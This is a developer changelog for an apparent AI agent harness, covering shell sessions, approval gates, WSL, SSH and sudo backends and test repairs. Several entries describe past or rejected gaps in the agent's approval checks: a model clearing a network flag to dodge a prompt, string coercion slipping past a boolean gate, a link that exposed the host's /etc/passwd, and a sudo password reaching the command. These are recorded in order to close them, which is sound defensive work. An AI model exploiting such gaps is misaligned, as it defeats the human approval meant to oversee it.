| Clean up containers by `venastine.sandbox=1` | `test_only_this_processs_containers_are_killed` | The process label |
| Count the session cap per owner | `test_the_cap_is_shared_across_owners` | Process-wide |
| Reserve a slot outside the lock | `test_concurrent_starts_at_the_last_slot_admit_exactly_one` | Check again under the lock |
| Skip the clamp, or refuse above the cap | `test_a_timeout_above_the_cap_is_clamped_and_said` | SS13 |
| Start a session where nothing can be woken | `test_nothing_starts_where_nothing_can_be_woken` | `consuming()` |
| Wake on the first match only, or once per match | `test_every_match_wakes_and_matches_before_a_take_coalesce` | Every match, coalesced per take |
| Reset the wake count on a wake | `test_waking_stops_at_the_limit_and_the_results_are_held`, `test_only_a_user_message_resets_the_count` | Only `note_user_input` resets |
| Wake the main conversation on the user's own kill | `test_a_users_kill_waits_for_their_next_message` | SS19 |
| Build the wake text without the real output policy | `test_the_real_output_policy_redacts_with_the_originating_tool` | `check_output_policy`, named for the tool |
| Write a wake as a plain user message, or run it without the run's channel and grant | `test_wake_conversation_writes_the_row_then_runs_the_loop` | `add_harness_message`, forwarded channel and grant |

## Batch 95 -- slice 1's tools, the sleeping subagent and the CLI (ROADMAP_v3 §49)

**`security/permissions.APPROVAL_BY_SHELL_MODE` replaces `name == "shell"`** in
`assert_permissions_declared`. A test asserting that `shell` is the SOLE approvals exemption now asserts
the SET; `test_permission_context.py::test_ac6_the_shell_mode_tools_are_the_sole_approvals_exemption` is
the one that does.

**`config.yaml` gained five `tool_permissions` keys and three `tool_approvals` keys**, so the tool tables
hold 28 and 25. `test_config_edit.py` counts 28 tools, 53 authority leaves and 128 settable scalars;
`test_config_loader.py` asserts `permissions - approvals == APPROVAL_BY_SHELL_MODE`; ARCHITECTURE's
registry paragraph states 16 of 28 advertised and 13 callable headless.

**`RunAgentLoop.wake_conversation` takes `authorization=`**, mutually exclusive with `granted_tools=`
exactly as `run_agent_conversation`'s is -- a caller passing both now raises rather than one silently
winning.

**`main.sessions` is a module-level alias for the manager, bound at import.** A test that replaces the
process's manager has to patch `main.sessions` as well as `core.shell_sessions.sessions`;
`test_session_cli.py`'s `manager` fixture is the pattern.

**`main.run_chat` waits on sessions between turns.** A CLI test whose stubbed turn starts a session does
not reach the next prompt until that session reports, and the same is true of a spawn: a test stubbing
`run_agent_conversation` and starting a session inside it must let that session finish, or the call
sleeps until the session's own timeout. Both new test files finish theirs deterministically, and their
`_start` helpers pass a short timeout so a mistake fails in seconds instead of blocking on the real cap.

| Change | Test | Fix |
|---|---|---|
| Register a start tool without shell's own approval check | `test_an_exempt_tool_that_lost_the_gate_is_refused_at_import` | `_assert_shell_mode_exemption`, by identity |
| Give `shell_background` or `shell_monitor` a `tool_approvals` field | `test_only_the_start_tools_skip_the_approvals_table` | SS16 -- the mode is the gate |
| Advertise a start tool where nothing can be woken | `test_hidden_where_nothing_would_wake_the_run` | `available_check=shell_sessions.available` |
| Ask a human about a start that will be refused | `test_the_loop_never_asks_about_a_refused_start` | `refusal_check` before the gate (A7) |
| Take the owning thread from params instead of the injected memory | `test_a_conversation_sees_only_its_own_sessions` | `memory.thread_id` |
| Wake the agent for a session it stopped itself | `test_the_agents_own_kill_is_its_own_report_and_wakes_nobody` | The kill claims the report |
| Keep that claim when the kill wait expires | `test_a_session_that_outlives_the_kill_wait_still_wakes` | Release it under the lock |
| Return from a spawn with the child's sessions live | `test_a_started_session_is_reported_before_the_parent_hears_back` | `_sleep_for_sessions` |
| Leave a failed child's sessions running | `test_its_sessions_are_stopped_and_the_error_still_propagates` | `kill_by_span` |
| Wait forever for a subagent nobody can reset | `test_past_the_limit_what_is_waiting_arrives_in_one_last_wake` | SS20's final wake |
| Run a CLI wake turn without the run's authorization | `test_a_wake_turn_carries_the_runs_authorization` | Forward the bundle |
| Let Ctrl+C during the wait kill the harness | `test_ctrl_c_stops_the_sessions_and_keeps_the_harness` | Kill the sessions, keep the prompt |
| Start a turn for a kill the USER made | `test_a_user_kill_is_delivered_with_the_next_message` | Held, written with the next message |
| Quit with sessions live without asking | `test_quitting_with_a_live_session_asks_first` | SS6 |

## Batch 96 -- the digest draws one line and a whole URL; the research panel belongs to its thread

Three defects reported against the shipped TUI, two of them in one producer.
`safety/policy_enforcement.param_digest` is the single source of the transcript's `▸ name  digest`
line, `core/replay.py`'s replayed copy and the research pass trace, so both of its defects were
drawn three times: a multi-line command kept its newlines (measured at three rows, only the first
indented), and a URL was capped at 60 characters, which left the drawn text a *valid shorter URL*
that a terminal's own link detector would open instead of the one the harness resolved. The third
is a call site: `ResearchProgress` was the last piece of per-thread state that survived
`switch_to_thread` and `/new`.

| Change | Test | Fix |
|---|---|---|
| Drop the whitespace collapse from `param_digest` | `test_a_multi_line_command_collapses_to_one_row` | A digest is drawn as ONE row and nothing downstream re-flows it, so every newline it carries is a row at column 0, outside the indent and outside the tool's own line |
| Collapse whitespace AFTER truncating | `test_the_collapse_happens_before_the_truncation` | Sixty characters has to mean sixty VISIBLE ones. Truncating first spends the budget on whitespace, so the cap cuts a different amount of real text depending on how the command happened to be indented |
| Widen the per-value URL cap without widening the total | `test_the_total_cap_does_not_re_truncate_a_whole_url` | A value kept whole at 200 and then cut by the 140-character TOTAL is the same visible-text/target mismatch one line further down. Both caps move or neither does |
| Widen every value instead of only URL-bearing ones | `test_a_digest_with_no_url_keeps_its_old_width` | A `write` digest would start pasting 240 characters of file content into the transcript, which is the thing the general cap exists to stop |
| Assume a long URL is no longer elided | `TestTheDigestBoundary`, `TestALongURLIsArmedBehindItsTruncation` | Batch 65's elision is UNCHANGED past the wider cap; only where it begins moved. Both suites sweep the new boundary, so a URL past 200 still draws a prefix and resolves through `call_links` |
| Make `ResearchProgress.reset()` hide the panel | `test_it_starts_hidden_and_a_run_reveals_it`, and `test_todo.py`'s one-way-reveal pins | The reveal is one-way WITHIN a thread on purpose -- a finished run stays readable beside its report. `clear_for_thread()` is a separate method because the argument stops at the thread boundary, not because hiding is generally wanted |
| Clear the panel in `switch_to_thread` only | `test_new_clears_the_research_panel` | `/new` carries its own copy of that teardown list, so a fix applied to one site leaves the other wrong -- which is how the panel came to be missing from both |
| Pin `clear_for_thread()` instead of the transitions that call it | — (it is an absence) | The defect was a missing CALL SITE, not a missing method. A widget-level test stays green with both call sites deleted, which is the vacuous version of this assertion |
| Regenerate the bandit baseline to clear a new finding | — | `bandit.yml` names the procedure and its precondition; batch 96 hand-added two triaged entries instead. On Windows a local run matches NOTHING, because bandit records `.\x.py` where the checked-in baseline has `./x.py` — so a baseline regenerated here would be committed unmatchable in CI. See `TECHNICAL_DEBT.md` 22 |

## Batch 97 -- the TUI becomes a wake consumer (ROADMAP_v3 §49, slice 1's behaviour half)

Until this batch a background session could not be started from the TUI at all, and nothing said so.
SS17 refuses a start unless a wake consumer is registered for the run, `shell_sessions.consuming()` is
the mark it checks, and nothing under `tui/` had ever entered it -- so the five tools built in batch 95
were reachable from the CLI and inert in the shell most people use. The fix is one `with` block on the
turn worker, and everything else in this section follows from the turn now outliving its own generator.

The other half is SS2: a shell can now be occupied for two different reasons. `_busy` was checked at
eight sites with the same three lines copied between them, and live sessions block the same set of
actions for a different reason and with a different remedy. `refuse_if_occupied` is the one place the
question is asked.

| Change | Test | Fix |
|---|---|---|
| Enter `consuming()` at the call site instead of inside `_consume` | `test_the_drain_runs_inside_consuming` | It is a ContextVar, and a thread does not inherit its parent's context. The generator runs on the worker, so the mark has to be set there or SS17 refuses every start the turn makes |
| Give a refusal site its own `_busy` check back | `test_no_handler_still_writes_the_busy_refusal_itself` | Eight sites growing a second clause each is how the two halves of one question drift apart -- and only one of them would learn about sessions. The AST walk asserts the string is written in exactly one place |
| Ask `_busy` before sessions in the funnel | `test_the_session_message_wins_over_the_busy_one` | While the wait loop runs, `_busy` is true BECAUSE sessions are live. "Still working" is then accurate and useless: it names no way out, and the session message is the only thing telling a blocked user which key un-blocks them |
| Read `self.memory` in `_session_thread` | `test_a_shell_with_no_thread_does_not_make_one` | The public property constructs a ConversationMemory and writes a thread row on first touch. Asking "is anything running?" must not be what starts a conversation |
| Drop the `sessions.closing` guard from the wait loop | `test_a_closing_harness_stops_the_loop` (hangs, rather than fails) | `wait_for_wake` returns None instantly once that flag is up, so the loop spins at full speed through teardown. Nothing is left to wake either: the row saying what became of the sessions is written by the quit path |
| Draw the whole wake row rather than its first line | `test_the_wake_line_is_the_first_line_only` | `core/replay.py` draws the first line only for the same row, so the live line and the replayed one would disagree -- and the rest is program output that can run to thousands of lines |
| Post the harness line after the turn's events | `test_the_harness_line_precedes_the_turn_it_prompted` | The answer would land above the row that prompted it. One thread posts both, and Textual's queue is FIFO, so ordering is the post order |
| Call `wake_conversation` from the TUI | — (it is a shape, not a failure) | It drains. Its own docstring says the TUI builds its own generator, as it does for a user's turn, or a wake turn's tool calls and thinking arrive as one blob with no `▸` lines |
| Write held results with `append_harness_row` | `test_held_results_are_written_through_the_live_memory` | main.py uses it because the CLI holds no ConversationMemory between turns. The TUI always does, and writing straight to storage leaves the live memory one row short of what was persisted -- so the turn about to run sends a history missing the results it is being handed |
| Deliver held results after `add_user_message` | `test_the_turn_delivers_them_before_the_users_own_message` | They would reach the model as a turn that happened later than the message they were meant to arrive beside (SS19) |
| Kill from the message pump | `test_killing_happens_off_the_ui_thread` | `SessionManager.kill` waits up to `_KILL_SETTLE_S` (15 s) for the process to die, so the shell would freeze for as long as the thing being killed took to notice |
| Assert a kill's state to tell a user kill from a model kill | `test_the_kill_is_the_users_and_not_the_models` | Both end at `KILLED`. What distinguishes them is where the event goes: the agent's own kill takes it as its RESULT, the user's is HELD for their next message |
| Kill outright when exactly one session is live | `test_one_session_still_opens_the_picker` | §49's adopted default, overturned by the owner in batch 97. It made one key mean two things and put the destructive one on the case with no confirmation |
| Scope the kill picker to the current thread | `test_the_picker_offers_another_threads_sessions_too` | SS11 scopes the TOOLS, because an agent has no business naming a session it did not start. This is the user's kill, and what is blocking them may be owned by a subagent's thread (SS9) |
| Put `/kill` behind `refuse_if_occupied` | `test_the_command_is_not_behind_the_funnel` | SS2 keeps a kill usable precisely while sessions block everything else. A funnel that refused it would refuse the only way out of the block it enforces |
| Return False from `check_action("kill_session")` while idle | `test_the_footer_greys_the_key_when_nothing_runs` | False drops the entry and reflows the footer; None greys it. The control a blocked user needs has to stay visible |
| Put the quit confirmation in `exit()` | `test_an_idle_shell_quits_without_asking` | Every exit route funnels through `exit()` -- a config restart, a programmatic close, the pump unwinding -- and a modal on that path is a shell that cannot be closed. The deliberate routes ask; `exit()` stays unconditional |
| Leave `_quit_asking` set after a decline | `test_declining_re_arms_the_question` | The shell could never ask again, so the next quit would go straight out past the confirmation SS6 requires |

## Batch 98 -- the display half: a panel, an openable line and two views (ROADMAP_v3 §49, SS14/SS18)

Batch 97 made the turn a wake consumer, so a session could be started; nothing on screen said one was
running, and a finished one could only be read by the model. This section is the other half, and most of
it is ordinary. One thing is not: the §47 mechanism that makes a tool line clickable had to widen, because
`ReplayEntry`'s fourth slot carried a bare call id armed only where the tool opened a THREAD. A
`▸ shell_background` line therefore could not be armed in a replay at all -- so a session would have opened
until you restarted, and then gone quiet with no error. The fix is one declaration (`registry.opens()`)
and one slot carrying `(kind, call id)` end to end.

SS18's other measurement: the saved wake record carries `{id, call_id, shape}` and nothing else, and the
row's text carries the command but never the rationale. So a rebuilt view reads the stored tool CALL --
the exact params the model sent -- rather than anything being duplicated into what is persisted.

| Change | Test | Fix |
|---|---|---|
| Carry a bare call id in `ReplayEntry`'s fourth slot | `test_a_stored_session_line_replays_armed` | A session line and a spawn line open different panes from different sources. Deriving the kind at the click would need the tool name, which a drawn line no longer has -- it is text and metadata by then |
| Ask `opens_thread` at a reader instead of `registry.opens()` | `test_replay_asks_the_registry_rather_than_naming_the_tool` | Two readers each growing the same second branch is how the live line and the replayed one come to disagree about what is clickable. §47 spent a declaration on that; a second kind must not spend it twice |
| Test `opens_session` before `opens_thread` in `opens()` | `test_one_question_with_three_answers` | A tool declaring both would silently open the wrong pane. Nothing declares both, and `test_no_tool_claims_both` is what keeps that true rather than assumed |
| Add a second side table for session calls beside `_agents` | `test_the_transcript_remembers_which_kind` | It is the same fact about a line -- what clicking it opens -- keyed by the same index with the same two lifetimes. A third dict is a third thing `reset()` and `rerender()` have to keep in step |
| Give the session panel its own `_fit` | — (it is a shape, not a failure) | It is the same box at the same width as the agent panel. Two copies of the ellipsis rule is how one of them starts shearing the sidebar |
| Draw the panel from `SessionRow`s directly | `test_the_command_goes_through_the_output_policy` | A sidebar is a display surface like any other. The rows reach the widget already redacted, so `tui/widgets.py` never holds an unredacted command -- `SessionKillScreen`'s rule from batch 97 |
| Show finished sessions in the panel | `test_the_panel_shows_live_sessions_only` | SS14. A finished session is reachable from the line that started it, so listing it spends contested sidebar rows on a second route to one pane -- and grows without bound in a session that starts many |
| Filter to live rows inside the sink | `test_the_message_carries_everything_and_the_handler_filters` | The message would stop being a faithful copy of what the manager said, and the next reader would inherit the first one's filter |
| Call `set_sink(None)` unconditionally at unmount | `test_it_drops_only_its_own` | The manager is a module singleton and a shell is not. An app tearing down would silence whatever mounted after it -- which the suite does every time it mounts a second one |
| Register the sink at construction rather than at mount | — (it is an ordering, not a failure) | The first thing a sink does is post, and a message posted before the widgets exist is a handler querying a panel that is not there |
| Skip the mount-time seed | `test_a_shell_that_mounts_with_sessions_live_sees_them` | The sink only speaks on a CHANGE, so a shell that mounted while sessions were live would show a blank panel until the next one moved |
| Refresh the panel without refreshing bindings | `test_the_footer_follows_the_sessions` | SS2's kill key is bound only while something runs, so the footer entry has to appear and go with the sessions themselves |
| Add a second flag beside `_viewing` for sessions | `test_a_session_view_is_not_a_thread_view` | Two flags can both be true, and every derived fact -- the switcher, the crumb, the prompt, whether escape is bound -- reads one. §49's adopted default said to widen it, and this is why |
| Draw a session into `#thread-view` | `test_closing_resets_both_panes` | The thread poll repaints that pane from the archive, so a session drawn there is wiped by the next tick of a timer meant for something else |
| Poll a rebuilt view | `test_a_rebuilt_view_is_not_polled` | It has nothing to re-read. `_sync_view_poll`'s whole discipline is that the timer exists only while its subject is live |
| Compare the drawn tail's length in the session poll | `test_the_count_is_the_buffers_not_the_drawn_tail` | A session past the tail bound has a tail that stops changing LENGTH while its content goes on moving, so the view would freeze exactly when it gets interesting |
| Redraw a live view only on sink events | `test_it_repaints_only_when_the_output_moved` (the other direction) | The sink fires when a session MOVES, not when it prints. A background session's view would sit frozen between its first line and its last |
| Leave the view alone when a session finishes | `test_a_session_finishing_repaints_the_view_once` | The poll stops the moment the session stops being live, so the view would keep the last tick's `running` header for good |
| Key a rebuilt view by session id | `test_it_is_keyed_by_call_id_not_session_id` | A session id is a per-process counter. Last week's `s1` is not this process's `s1`, and the lookup would draw a different session with complete confidence |
| Trust `_session_calls` as the only route | `test_a_stale_map_entry_falls_through_to_the_archive` | A session pruned past the twenty kept (SS12) leaves the entry behind. The map is an optimisation for the common case; the manager and the archive are the two real sources |
| Ask the live thread for a session clicked inside the viewer | `test_the_thread_asked_is_the_one_on_screen` | A session line inside the thread VIEWER belongs to the run being read. The live conversation would answer "no such call" with complete confidence |
| Report a `matched` shape with the state words | `test_a_matched_monitor_is_not_reported_as_finished` | It is the one shape the two vocabularies do not share, and it means STILL RUNNING -- which a reader has to be told rather than left to infer from a word that sounds final |
| Return the output as one entry holding newlines | `test_output_is_one_entry_per_line` | A transcript indents the entry it is handed and draws an embedded block at column zero, so the quoted output would shear its own left edge |
| Give `output` the empty style like `assistant` | `test_every_theme_fills_every_role_slot` | The empty slot means "inherit", which is right for a pane's body text and wrong for a block quoted inside a frame of `system` lines. `assistant` is the one deliberately unstyled slot, and the suite says so |
| Draw session output in the `system` role | — (it is a reading, not a failure) | Dimmed italic is the worst possible treatment for forty lines of output, and it would claim the harness said them |


## Batch 99 -- the agent declares that a command needs the network (ROADMAP_v3 §50, NW1-NW5)

The network detector reads command TEXT against fourteen words. What it recognises it handles correctly;
what it cannot see was auto-approved under `contained` and then run under `--network none`, so the user
was never asked and the model was never told. §50's answer is a declaration rather than a better parser,
and the whole of it is one boolean OR'd into a fact that already existed.

The one thing worth reading twice: the gate reads the model's tool-call input BEFORE Pydantic validates
it, so `requires_network` can arrive as any JSON. `declared_network` is the single coercion both
consumers use, and it accepts only literal `True`.

| Change | Test | Fix |
|---|---|---|
| Let the flag OVERRIDE the network fact rather than OR into it | `test_a_recognised_command_keeps_its_network_when_the_flag_is_false` | An override lets a model clear the flag on `curl` to dodge a prompt. The flag can only add egress, which is what makes it safe to expose to the model at all |
| Coerce `requires_network` with `bool()` at the gate | `test_a_string_is_refused_by_the_model_not_silently_coerced` | Pydantic's plain `bool` would accept the string `"true"` while a gate using `is True` refused it -- the command approved as no-network and executed with it. `StrictBool` plus one shared coercion is what keeps the two readings identical |
| Skip the flag on an unmeasured profile | `test_an_unmeasurable_command_still_takes_the_flag` | NW2 says the flag only adds, with no exception. A carve-out is a second rule to remember, for two profiles that always ask a human anyway |
| Give the flag its own approval branch | `test_never_and_always_are_untouched` | NW3: once the fact is true the existing ladder does the work. A new branch would force a modal where the user's settings say there are none |
| Repeat the declaration in the prompt when the detector already saw it | `test_a_recognised_command_reads_as_one_fact` | One fact, one sentence. The extra clause exists to say the call ASKED for egress, which is only news when the detector did not already say so |
| Write the description separately for each of the three tools | `test_both_session_start_tools_take_it` | Three copies of a parameter's meaning is three chances to drift. `shell.ShellParams`' description is the one copy the session tools read |
| Assert the flag's effect through `tiered` | `test_contained_is_where_the_flag_changes_the_answer` | Under `tiered` a non-inert command already asks because `runs_code` is true (CE1), so such a test passes without the flag doing anything. `contained` is the mode where the declaration is the deciding fact |

---

## Batch 100 -- an interactive shell the agent types into (ROADMAP_v3 §49, slice 2)

| What broke | Why | The repair |
|---|---|---|
| `test_session_tools.py::test_the_start_tools_carry_shells_own_gate_by_identity` | `APPROVAL_BY_SHELL_MODE` gained `shell_interactive`, whose gate is deliberately NOT `shell._shell_approval_check` -- its yes covers every line typed into the session afterwards, so it cannot be a question about one command (SS29, SS32) | Repaired to assert per tool against `tools.registry._SHELL_MODE_GATES`, which pins MORE than the old check: a name added to the exempt set with no entry in the mapping now fails, where before any shell gate would have done |
| `test_session_tools.py::test_a_start_asks_exactly_when_the_same_command_would` | Same change. The claim is true of the two command-shaped starts and deliberately FALSE of the interactive one | `STARTERS` split: `COMMAND_GATED` for that sweep, and a new test pinning the DIFFERENCE -- opening with `pwd` asks where `pwd` through `shell` does not. Widening the tuple would have hidden the property the batch exists to create |
| `test_permission_context.py::test_ac6_the_shell_mode_tools_are_the_sole_approvals_exemption` | The exempt set is pinned exactly, on purpose, so a future omission cannot ride in on its precedent | The set now names four, and the test also asserts `shell_input` is NOT in it and DOES carry an approvals field -- typing into a session already approved is an ordinary tool |
| `tests/conftest.py`'s `FakeSessionProcess` | Gained a `stdin` recorder, a `prompt_token` and a `prompt()` method | Additive; every slice-1 test passes unchanged. The new `interactive_starter` fixture is separate because the manager passes `prompt_token` only for that kind, so a slice-1 fake still sees the call it always saw |

**If you are here because a send test hangs or reports the wrong bound:** the settle interval is not
decoration. `_wait_after_input` requires the prompt to be followed by `_INPUT_QUIET_S` of silence, and
with a FROZEN clock that can never elapse -- which is why the lifetime tests set it to zero and the send
tests use a real clock. Removing the settle makes a prompt passed through on the way to a queued line
read as the answer to the line just sent.

## Batch 101 -- the WSL backend (ROADMAP_v3 §49 slice 3)

| What broke | Why | The repair |
|---|---|---|
| `tests/test_posture.py`, fourteen tests at once | `Posture` gained `allow_wsl_backend`, and every test in `TestUnsafeReasons` built one from five POSITIONAL booleans | A `_shipped(**overrides)` helper. None of the fourteen breaks was about what its test asserted, which is the argument for the helper rather than for renumbering the arguments: the next posture field costs one function |
| `test_config_edit.py::test_setting_every_leaf_to_its_own_value_changes_nothing` | `config.yaml` gained `allow_wsl_backend` and `wsl_distro` | 132 settable scalars -> 134 |
| `test_posture.py::test_the_config_command_gates_every_posture_key` | `HARNESS_AUTHORITY_KEYS` gained `allow_wsl_backend`, and the test pins the count exactly so an omission cannot ride in | 9 -> 10, plus the effect sentence `/config`'s gate requires |
| `test_session_backends.py::test_route_and_containment_for_agree` | EP6's matrix gained a backend dimension | Widened in place to 80 cells, NOT copied. A second matrix would be a second place for the two halves of one decision to be held together, which is the shape EP6 exists to prevent |
| `test_docs_consistency.py::test_a_claimed_range_covers_its_whole_family` | The record defines SS35-SS45 | AGENTS.md's map says SS1-SS45 |
| Nothing in `core/shell_sessions.py`'s starter contract | `backend` is passed to the starter ONLY when it is not the default | Every slice-1 fake -- none of which accepts the keyword -- works unchanged. `prompt_token`'s rule, for `prompt_token`'s reason |

**If you are here because a `_within` test started asking where it used to auto-approve:** that is
SS45, and it is deliberate. A path component that `lexists` and does not `exist` is a link this
platform cannot follow, and `_within` now answers False for it -- on every route, not only WSL. A
missing file is unchanged (`lexists` is False for it, so it is still INERT); a real file is unchanged;
a link the distro made into `/etc` now classifies HOST_READ and asks. If you want the old answer back,
read SS45 first: the behaviour it replaced returned the host's `/etc/passwd` through an auto-approved
`cat`.

## Batch 102 -- the SSH backend (ROADMAP_v3 §49 slice 4)

| What broke | Why | The repair |
|---|---|---|
| `shell.wsl_refusal` | It now refuses for two uncontained backends, and a function named after one of them reads as a WSL special case rather than the funnel it is | Renamed to `shell.uncontained_refusal`. Signature and every WSL answer unchanged. Call sites: the gate, `shell.run`, `shell_sessions._start`, and five in `tests/test_wsl_backend.py` |
| `tests/test_posture.py`, eighteen tests | `Posture` gained `allow_ssh_backend` | One line in the `_shipped()` helper batch 101 added for exactly this. The helper paid for itself on its first repeat |
| `test_config_edit.py::test_setting_every_leaf_to_its_own_value_changes_nothing` | `config.yaml` gained eight keys: the authority flag and seven host scalars | 134 settable scalars -> 142 |
| `test_posture.py::test_the_config_command_gates_every_posture_key` | `HARNESS_AUTHORITY_KEYS` gained `allow_ssh_backend`, and the count is pinned exactly so an omission cannot ride in | 10 -> 11, plus the effect sentence `/config`'s gate requires |
| `test_session_backends.py::test_route_and_containment_for_agree` | EP6's matrix gained a third backend | Widened IN PLACE to 120 cells, and the two per-backend availability flags collapsed into ONE `backend_up` -- `_route` and `containment_for` each read only the backend the call asked for, so the cross product answers nothing the single flag does not |
| `test_docs_consistency.py::test_a_claimed_range_covers_its_whole_family` | The record defines SS46-SS55 | AGENTS.md's map says SS1-SS55 |

**If you are here because an SSH command asked when you expected it not to:** that is SS48, and it is
the whole point of the route. Every other backend runs a read-only in-workspace command unasked; this
one asks about everything under `tiered` and `contained` alike, including `ls`. `never` still means
never, because SS1 already said so and this slice widened no mode. There is no setting that turns the
asking off, and the reason is in `docs/SECURITY.md`.

**If you are writing a test that calls `_ssh_argv` without probing first:** it works now, and it did
not before. The builder used to read the probe's `known_hosts` path and fall back to `""`, emitting
`UserKnownHostsFile=` with no value -- an argv `ssh` rejects outright, surfaced as "the host could not
be reached". Production never hit it because `_route` probes first; every mocked test handed the
builder a path and so asserted the assumption. A LIVE test found it, which is the argument for keeping
the `needs_ssh` half of `test_ssh_backend.py` alive rather than trusting the 124 that run everywhere.

## Batch 103 -- the harness-held secret store (ROADMAP_v3 §49 slice 5a)

| What broke | Why | The repair |
|---|---|---|
| `tests/test_cli.py::TestEveryKindIsRendered` | `interaction.SAFE_DEFAULTS` gained `SECRET`, and this table's own guard fails when a kind is missing from it | One row in `_PAYLOADS`. The guard worked exactly as written -- it is there so a kind cannot be added without a branch in BOTH shells (audit #7) |
| `tests/conftest.py::FakeStdinReader` | The CLI's SECRET handler reads through `readline_masked`, which the fake did not have | Added, recording into `prompts` like its siblings AND into a new `masked_prompts`, so a test can assert the secret was asked for through the MASKED method -- a handler calling `readline` would fill `prompts` and echo the passphrase on a real terminal |
| `docs/ARCHITECTURE.md`'s tree | Two new modules and two new test files | `security/secrets.py`, `security/askpass.py`, `test_secrets.py` (59), `test_askpass.py` (26); `test_ssh_backend.py` 136 -> 167, `test_interaction.py` 92 -> 97, `test_cli.py` 98 -> 99; 88 -> 90 test files; 5536 -> 5658 |
| `AGENTS.md`'s decision map | The record defines SS56-SS66 | SS1-SS55 -> SS1-SS66 |
| `requirements.txt` | `cryptography` is now declared | It was ALREADY installed -- `google-genai` -> `google-auth` -> `cryptography>=38.0.3`, a hard requirement -- so no environment changes. `pip install -r requirements.txt` resolves identically |

**If you authenticate with a key and an agent, nothing changed.** The SSH connection argv is asserted byte-identical to the literal slice 4 shipped whenever no secret is stored for the host, including when a store EXISTS but is locked. `BatchMode=yes` comes off only when this process is actually holding a credential for that host, and that is the one condition under which it could not have worked before.

**If a test of yours leaves the secret store unlocked**, the next test in the same process inherits it -- the store is module state, like the SSH probe. `tests/test_ssh_backend.py`'s `ssh_secrets` fixture locks on the way in and out and resets the auth quarantine at both ends, which is the pattern to copy. A test that trips the quarantine without clearing it makes every later test in the file assert against an unavailable backend.

## Batch 104 -- a command the harness runs as root (ROADMAP_v3 §49 slice 5b)

| What broke | Why | The repair |
|---|---|---|
| `tests/test_ssh_backend.py::_FakeProc` | `_run_ssh_process` now calls `communicate(input=...)` -- a sudo password on the root path and `None` everywhere else -- and the double took only `timeout` | One keyword, plus a `last_input` class attribute so the double RECORDS what it was given. A double that silently swallowed the argument would let the no-secret claims pass without being about anything, so there is now a test asserting an ordinary SSH run writes `None` |
| `security.sandbox._run_wsl` | Split into `_run_wsl` and `_run_wsl_process`, so the window in which a plaintext is in flight is a block rather than a try/finally wrapped round three returns and a raise | `_run_ssh_process`'s shape from batch 103, for its reason. Callers of `_run_wsl` are unchanged; a test that patched its internals is not |
| `security.sandbox._wsl_argv`, `_ssh_remote_script`, `_ssh_argv`, `_run_wsl`, `_run_ssh`, `_run_ssh_process`, `_annotate`, `run_sandboxed`, `start_sandboxed` | All gained an `as_root` / `needs_root` / `sudo_secret` parameter | Every one defaults to the unrooted behaviour, and the no-root argv is asserted byte-identical to the literal `9048427` shipped -- proved against the pre-patch module, not against a literal typed twice |
| `tools.builtin.shell.uncontained_refusal` | A third refusal that is true of every backend including the container: a call that asked for root and cannot have it | A third parameter, `needs_root=False`, defaulting to today's answer. Call sites: the gate, `shell.run`, `shell_sessions._start` |
| `core.shell_sessions.SessionManager.start` | One more kwarg through to the backend | `needs_root=False`, passed into the existing `extra` dict and only when true -- so a slice-1 fake starter still sees the call it has always seen |
| `docs/ARCHITECTURE.md`'s tree | One new test file | `test_sudo.py` (138); `test_ssh_backend.py` 167 -> 168; 90 -> 91 test files; 5680 -> 5819 |
| `AGENTS.md`'s decision map | The record defines SS67-SS72 | SS1-SS66 -> SS1-SS72 |
| `security/posture.py`'s WSL pair | Its last sentence was FALSE under the fallback opt-in | Two spellings, chosen from the two fields the posture already holds. §48 (CE6)'s correction, applied to a second pair |

**If a WSL command of yours suddenly reads nothing from stdin**, that is SS70 and it was a bug before.
`_run_wsl` passed no `stdin=` at all, so a command in the distro INHERITED this process's console --
measured, a command there read a string written to the harness's own stdin. It is `DEVNULL` now, which
is what the container and the SSH one-shot already gave. The container, inert and host-fallback
one-shots still inherit and that is recorded rather than fixed: they are not on this batch's route.

**If you read anywhere that `-k` stops the sudo password reaching the command, that was wrong.**
SS66 said it, the gap register repeated it, and both are corrected. `sudo -S` reads stdin only when it
must AUTHENTICATE; under a NOPASSWD rule it reads nothing and the password becomes the command's own
input. Reproduced on sudo-rs 0.2.13 and on classic Sudo 1.9.17p2, **with `-k` and without it**. The
control is `_SUDO_STDIN_GUARD` -- `exec 0</dev/null; ` in front of the command inside the rooted shell.
`-k` stays for what it does do: one approval buys exactly one authentication.

**If a root command of yours asks when you expected the opt-in to cover it:** that is SS65, and it is
the point. `AUTO_APPROVE_SANDBOX_FALLBACK` was measured answering for the ENTIRE WSL backend, so a root
step below it would have been dead code on the one backend where root is most reachable. There is no
setting that turns the asking off short of `shell_approval_mode: never`, which already means never.

**If a test of yours trips the sudo quarantine without clearing it**, every later test in the same
process sees that backend refusing root. `tests/test_sudo.py` clears it in an autouse fixture at both
ends, which is the pattern to copy -- `sandbox._reset_sudo_quarantine()`.
---

## Batch 105 -- paging for the network tools (ROADMAP_v3 §51)

| What broke | Why | The repair |
|---|---|---|
| `tools.builtin.arxiv._parse_atom_feed` | Returns `(entries, total)` where it returned a bare list, so a result can report `opensearch:totalResults` | Unpack two values. It has no caller outside its own module; `_call_arxiv_api`, which several tests DO patch, is unchanged in arity for its first three arguments and takes `start` as a fourth with a default |
| `tools.builtin.arxiv._cache` | Its value is now `(results, total)` rather than `results` | Nothing outside the module reads it. If you build one by hand in a test, build the pair |
| `tools.builtin.web_search._call_ddgs` | Takes `page` as a third argument and passes it to `DDGS.text` | Defaults to 1, which is `ddgs`'s own default. **A double for this function must accept it** -- and a double that swallows it silently is why M40 survived the first mutation pass: every test patched `_call_ddgs`, so dropping `page=` INSIDE it was invisible. Patch `web_search.DDGS` instead when the claim is about what reaches the provider |
| `tools.builtin.web_search.SearchResult` | A `snippet_truncated` field, so `model_dump()` has one more key | Defaults `False`. A consumer comparing a whole dict to a literal needs the key; `source_corpus` reads by name and is unaffected |
| `core.reasoning.source_corpus.SourceDocument` | A `next_offset` field | Defaults 0. It is in the SOURCE document's character positions, not held characters -- the two coincide only at offset 0, which is exactly why a test that starts at 0 cannot tell them apart |
| `core.reasoning.source_corpus._store` | A fifth parameter, `offset=None`, and a branch that APPENDS instead of competing on length | `None` means "this tool does not page" and reproduces the old behaviour exactly; `0` means "page one of something that may have more". The two are deliberately not the same value |
| `tools.builtin.fetch_url.run` | Returns `offset`, `chars_available` and sometimes `message` beside the three keys it returned before | The three old keys keep their exact values, `truncated` included, at every size on both sides of the page boundary. Added keys are safe here by the §51 gap register's own rule; changed ones would not be |
